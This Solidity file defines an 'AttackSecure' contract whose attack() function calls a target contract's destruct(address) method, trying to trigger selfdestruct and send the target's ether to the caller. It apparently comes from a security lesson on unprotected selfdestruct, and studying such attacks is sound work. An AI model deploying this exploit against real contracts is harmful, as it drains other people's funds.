pragma solidity ^0.8.13;

contract AttackSecure {
  //storage variable for the secure contract address
  address payable secureContractAddr;

  constructor(address payable _secureAddress) public {
    secureContractAddr = _secureAddress;
  }

  /**
   * @dev attack the secure contract by calling destruct method which inturn calls selfdestruct- this will
   * @dev send the contract ether balnce to the msg.sender.
   */
  function attack() external payable {
    bytes memory payload = abi.encodeWithSignature(
      "destruct(address)",
      msg.sender
    );
    secureContractAddr.call(payload);
  }
}
